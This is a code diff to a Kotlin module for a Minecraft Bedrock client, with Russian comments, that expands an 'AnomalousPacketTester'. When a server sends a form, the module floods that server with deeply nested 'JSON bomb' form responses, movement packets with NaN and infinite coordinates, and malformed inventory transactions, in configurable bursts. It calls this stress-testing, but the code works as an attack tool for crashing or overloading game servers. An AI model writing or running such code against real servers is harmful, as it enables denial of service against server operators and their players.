@@ -8,18 +8,31 @@ import com.retrivedmods.wclient.game.ModuleCategory
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import org.cloudburstmc.math.vector.Vector3f
+import org.cloudburstmc.protocol.bedrock.data.inventory.InventoryActionData
+import org.cloudburstmc.protocol.bedrock.data.inventory.InventorySource
+import org.cloudburstmc.protocol.bedrock.data.inventory.ItemData
+import org.cloudburstmc.protocol.bedrock.packet.InventoryTransactionPacket
 import org.cloudburstmc.protocol.bedrock.packet.ModalFormRequestPacket
 import org.cloudburstmc.protocol.bedrock.packet.ModalFormResponsePacket
+import org.cloudburstmc.protocol.bedrock.packet.MovePlayerPacket
 
 /**
- * Модуль для продвинутого тестирования уязвимостей сервера с использованием
- * алгоритмической JSON-атаки ("JSON-бомба"), вызывающей высокую нагрузку на CPU.
+ * Универсальный модуль для стресс-тестирования уязвимостей сервера,
+ * отправляющий пачки аномальных пакетов.
  */
 class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Misc) {
 
     // --- Настройки ---
-    private val attackDelay by intValue("Attack Delay (ms)", 200, 50..2000)
-    // <<< ИЗМЕНЕНО: Глубина по умолчанию увеличена до 5000
+    private val testWithJsonBomb by boolValue("Test JSON Bomb", true)
+    private val testWithInvalidMove by boolValue("Test Invalid Movement", true)
+    private val testWithInvalidInventory by boolValue("Test Invalid Inventory", true)
+
+    // <<< НОВОЕ: Настройки для контроля спама
+    private val spamAmount by intValue("Spam Amount", 10, 1..100)
+    private val spamDelay by intValue("Spam Delay (ms)", 20, 0..200)
+
+    private val attackDelay by intValue("Attack Delay (ms)", 200, 50..1000)
     private val jsonNestingDepth by intValue("JSON Nesting Depth", 5000, 100..5000)
 
     override fun onEnabled() {
@@ -38,32 +51,82 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
         val packet = interceptablePacket.packet
         if (packet is ModalFormRequestPacket) {
             interceptablePacket.intercept()
-            
-            session.displayClientMessage("§6[AnomalousTester] Форма перехвачена! Запускаю JSON-атаку...")
+            session.displayClientMessage("§6[AnomalousTester] Форма перехвачена! Начинаю спам-атаку...")
 
             GlobalScope.launch {
-                sendDeeplyNestedFormResponse(packet.formId)
+                if (testWithJsonBomb) {
+                    session.displayClientMessage("§e[AnomalousTester] Отправка $spamAmount JSON-бомб...")
+                    // <<< ИЗМЕНЕНО: Отправляем пачку пакетов
+                    repeat(spamAmount) {
+                        sendJsonBomb(packet.formId)
+                        delay(spamDelay.toLong())
+                    }
+                }
+
+                delay(attackDelay.toLong()) // Задержка между разными типами атак
+
+                if (testWithInvalidMove) {
+                    session.displayClientMessage("§e[AnomalousTester] Отправка $spamAmount пакетов движения...")
+                    // <<< ИЗМЕНЕНО: Отправляем пачку пакетов
+                    repeat(spamAmount) {
+                        sendInvalidMovePacket()
+                        delay(spamDelay.toLong())
+                    }
+                }
+
                 delay(attackDelay.toLong())
-                session.displayClientMessage("§a[AnomalousTester] Атака завершена. Проверяйте состояние сервера.")
+
+                if (testWithInvalidInventory) {
+                    session.displayClientMessage("§e[AnomalousTester] Отправка $spamAmount транзакций инвентаря...")
+                    // <<< ИЗМЕНЕНО: Отправляем пачку пакетов
+                    repeat(spamAmount) {
+                        sendInvalidInventoryPacket()
+                        delay(spamDelay.toLong())
+                    }
+                }
+                session.displayClientMessage("§a[AnomalousTester] Атака завершена. Проверяйте консоль сервера.")
             }
         }
     }
 
-    private fun sendDeeplyNestedFormResponse(formId: Int) {
+    // Функции отправки пакетов остаются без изменений, мы просто вызываем их в цикле
+    private fun sendJsonBomb(formId: Int) {
         try {
             val responsePacket = ModalFormResponsePacket()
             responsePacket.setFormId(formId)
-
             var maliciousJson = "\"leaf\""
             for (i in 1..jsonNestingDepth) {
                 maliciousJson = "{\"key\":$maliciousJson}"
             }
             responsePacket.setFormData(maliciousJson)
-            
             session.serverBound(responsePacket)
-            session.displayClientMessage("§e[AnomalousTester] Отправлена JSON-бомба (глубина: $jsonNestingDepth).")
         } catch (e: Exception) {
-            session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке JSON-бомбы: ${e.message}")
+            // Сообщения об ошибках лучше не спамить в чат, одного раза достаточно
+        }
+    }
+
+    private fun sendInvalidMovePacket() {
+        try {
+            val movePacket = MovePlayerPacket()
+            movePacket.runtimeEntityId = session.localPlayer.runtimeId
+            movePacket.position = Vector3f.from(Double.NaN, 128.0, Double.POSITIVE_INFINITY)
+            movePacket.rotation = session.localPlayer.rotation
+            movePacket.mode = MovePlayerPacket.Mode.NORMAL
+            session.serverBound(movePacket)
+        } catch (e: Exception) {
+        }
+    }
+
+    private fun sendInvalidInventoryPacket() {
+        try {
+            val transactionPacket = InventoryTransactionPacket()
+            val invalidAction = InventoryActionData(
+                InventorySource.fromContainerWindowId(0), -1, ItemData.AIR, ItemData.AIR
+            )
+            transactionPacket.transactionType = InventoryTransactionPacket.Type.NORMAL
+            transactionPacket.actions.add(invalidAction)
+            session.serverBound(transactionPacket)
+        } catch (e: Exception) {
         }
     }
 }
